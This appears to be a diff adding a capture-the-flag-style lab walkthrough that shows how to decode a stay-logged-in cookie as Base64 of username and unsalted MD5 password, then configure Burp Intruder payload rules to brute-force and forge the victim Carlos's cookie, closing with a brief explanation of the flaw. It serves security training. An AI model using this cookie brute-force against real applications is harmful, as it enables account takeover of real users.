@@ -3997,4 +3997,417 @@ User Authenticated
 ```
 
 ---
+
+# Brute-Forcing a Stay-Logged-In Cookie
+
 ![bsl](images/bsl.png)
+
+## Step 1: Login with "Stay Logged In" Enabled
+
+1. Open the login page.
+2. Enter your credentials.
+
+Example:
+
+```text
+Username: wiener
+Password: peter
+```
+
+3. Check:
+
+```text
+☑ Stay logged in
+```
+
+4. Login successfully.
+
+---
+
+## Step 2: Inspect the Cookie
+
+1. Open Burp Suite.
+2. Inspect the request headers or browser cookies.
+3. Locate:
+
+```http
+stay-logged-in=<value>
+```
+
+Example:
+
+```text
+d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
+```
+
+---
+
+## Step 3: Decode the Cookie
+
+Decode the Base64 value.
+
+Result:
+
+```text
+wiener:51dc30ddc473d43a6011e9ebba6ca770
+```
+
+Format:
+
+```text
+username:hash
+```
+
+---
+
+## Step 4: Identify the Hash
+
+Observe:
+
+```text
+51dc30ddc473d43a6011e9ebba6ca770
+```
+
+Characteristics:
+
+- 32 characters
+- Hexadecimal characters only
+
+This suggests:
+
+```text
+MD5 Hash
+```
+
+---
+
+## Step 5: Verify the Hash
+
+Generate the MD5 hash of your password.
+
+Example:
+
+```text
+Password: peter
+```
+
+MD5:
+
+```text
+51dc30ddc473d43a6011e9ebba6ca770
+```
+
+Match confirmed.
+
+Therefore the cookie format is:
+
+```text
+base64(username:md5(password))
+```
+
+---
+
+# Create Intruder Attack
+
+## Step 6: Logout
+
+1. Logout of your account.
+
+---
+
+## Step 7: Send Request to Intruder
+
+1. Find:
+
+```http
+GET /my-account?id=wiener
+```
+
+2. Highlight:
+
+```http
+stay-logged-in=<cookie>
+```
+
+3. Right-click.
+4. Select:
+
+```text
+Send to Intruder
+```
+
+---
+
+## Step 8: Verify Payload Position
+
+Burp automatically marks:
+
+```http
+Cookie: stay-logged-in=§cookie-value§
+```
+
+---
+
+# Test Cookie Generation
+
+## Step 9: Add Single Payload
+
+1. Open **Payloads**.
+2. Add your password only.
+
+Example:
+
+```text
+peter
+```
+
+---
+
+## Step 10: Configure Payload Processing Rules
+
+Open:
+
+```text
+Payload Processing
+```
+
+Add rules in this exact order:
+
+### Rule 1
+
+```text
+Hash → MD5
+```
+
+---
+
+### Rule 2
+
+```text
+Add Prefix → wiener:
+```
+
+---
+
+### Rule 3
+
+```text
+Encode → Base64 Encode
+```
+
+---
+
+## Step 11: Configure Grep Match
+
+1. Open:
+
+```text
+Settings
+```
+
+2. Under:
+
+```text
+Grep - Match
+```
+
+3. Add:
+
+```text
+Update email
+```
+
+Reason:
+
+```text
+This string only appears when authenticated.
+```
+
+---
+
+## Step 12: Start Attack
+
+1. Launch attack.
+2. Observe results.
+
+Successful result:
+
+```text
+Update email
+```
+
+This confirms:
+
+```text
+Cookie generation works correctly.
+```
+
+---
+
+# Attack Carlos Account
+
+## Step 13: Modify Attack
+
+### Change Payload List
+
+Remove:
+
+```text
+peter
+```
+
+Add:
+
+```text
+candidate password list
+```
+
+---
+
+### Change URL
+
+From:
+
+```http
+GET /my-account?id=wiener
+```
+
+To:
+
+```http
+GET /my-account?id=carlos
+```
+
+---
+
+### Change Prefix Rule
+
+From:
+
+```text
+wiener:
+```
+
+To:
+
+```text
+carlos:
+```
+
+---
+
+# Cookie Generation Logic
+
+Each password becomes:
+
+### Step 1
+
+```text
+candidate-password
+```
+
+↓
+
+### Step 2
+
+```text
+MD5(candidate-password)
+```
+
+↓
+
+### Step 3
+
+```text
+carlos:MD5(candidate-password)
+```
+
+↓
+
+### Step 4
+
+```text
+Base64(carlos:MD5(candidate-password))
+```
+
+↓
+
+### Step 5
+
+```text
+Inserted into stay-logged-in cookie
+```
+
+---
+
+## Step 14: Start Attack
+
+1. Launch the Intruder attack.
+2. Wait for completion.
+
+---
+
+## Step 15: Find Successful Response
+
+Observe:
+
+```text
+Grep Match
+```
+
+column.
+
+Only one request should contain:
+
+```text
+Update email
+```
+
+This indicates:
+
+```text
+Valid stay-logged-in cookie found.
+```
+
+The password used in that request is Carlos's password.
+
+---
+
+## Step 16: Solve the Lab
+
+1. Open the successful response.
+2. Load it in the browser.
+
+You are now authenticated as:
+
+```text
+carlos
+```
+
+3. The lab is solved.
+
+---
+
+# Vulnerability Explanation
+
+Cookie Format:
+
+```text
+Base64(username:MD5(password))
+```
+
+Problem:
+
+```text
+The application stores authentication data using a predictable hash.
+```
+
+Since:
+
+```text
+MD5 is fast and unsalted
+```
+
+an attacker can brute-force candidate passwords and generate valid cookies.
+
+---
